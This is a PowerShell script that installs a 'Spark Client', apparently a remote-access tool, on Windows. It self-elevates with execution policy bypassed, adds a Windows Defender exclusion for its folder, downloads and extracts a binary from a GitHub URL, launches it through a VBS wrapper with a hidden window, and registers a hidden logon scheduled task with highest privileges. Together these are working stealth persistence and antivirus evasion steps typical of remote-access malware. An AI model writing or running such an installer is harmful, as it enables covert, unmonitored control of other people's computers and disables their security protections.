# install-spark-client.ps1
# Auto install Spark Client on Windows
# - Download client.zip from GitHub
# - Extract client.exe to C:\Program Files\Spark
# - Create run-client.vbs wrapper to launch hidden
# - Register scheduled task at user logon (hidden, highest privileges)
# - Add Windows Defender exclusion

$RepoUrl = "https://raw.githubusercontent.com/tutamdev/remote-desktop/main"
$ZipUrl  = "$RepoUrl/client.zip"
$TempZip = Join-Path $env:TEMP "client.zip"

$DestDir = "C:\Program Files\Spark"
$DestExe = Join-Path $DestDir "client.exe"
$WrapperVbs = Join-Path $DestDir "run-client.vbs"
$TaskName = "SparkClient"

$CurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

Write-Host ">>> Installing Spark Client for user: $CurrentUser"

# 0. Ensure running as Administrator
$principal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Write-Host ">>> Script is not running as Administrator. Requesting elevation..."
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# 1. Create destination folder
if (!(Test-Path -Path $DestDir)) {
    Write-Host ">>> Creating folder: $DestDir"
    New-Item -Path $DestDir -ItemType Directory -Force | Out-Null
}

# 1.1. Add Defender exclusion early
Write-Host ">>> Adding Windows Defender exclusion: $DestDir"
try {
    Add-MpPreference -ExclusionPath $DestDir
    Write-Host ">>> Defender exclusion added successfully."
} catch {
    Write-Warning ">>> Failed to add Defender exclusion (please run PowerShell as Administrator)."
}

# 2. Download client.zip
Write-Host ">>> Downloading client.zip from $ZipUrl"
Invoke-WebRequest -Uri $ZipUrl -OutFile $TempZip -UseBasicParsing

# 3. Extract zip
Write-Host ">>> Extracting client.exe to $DestDir"
Expand-Archive -Path $TempZip -DestinationPath $DestDir -Force

# 4. Stop any running client
Write-Host ">>> Stopping existing client process (if any)"
Get-Process -Name "client" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

# 5. Create VBS wrapper to run client.exe hidden
Write-Host ">>> Creating VBS wrapper: $WrapperVbs"
$vbscode = @"
CreateObject("Wscript.Shell").Run """$DestExe""", 0, False
"@
$vbscode | Out-File -FilePath $WrapperVbs -Encoding ASCII -Force

# 6. Remove old scheduled task if exists
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
    Write-Host ">>> Removing old scheduled task: $TaskName"
    Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}

# 7. Register scheduled task (run hidden at logon, call VBS)
Write-Host ">>> Registering scheduled task: $TaskName"
$Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$WrapperVbs`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
$Settings = New-ScheduledTaskSettingsSet -Hidden -StartWhenAvailable -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
$Principal = New-ScheduledTaskPrincipal -UserId $CurrentUser -LogonType Interactive -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings -Principal $Principal

Write-Host ">>> Done. Spark Client will auto-start hidden (via VBS) when $CurrentUser logs in."

# 8. Start task immediately (so client runs without reboot)
Write-Host ">>> Starting Spark Client now..."
Start-ScheduledTask -TaskName $TaskName
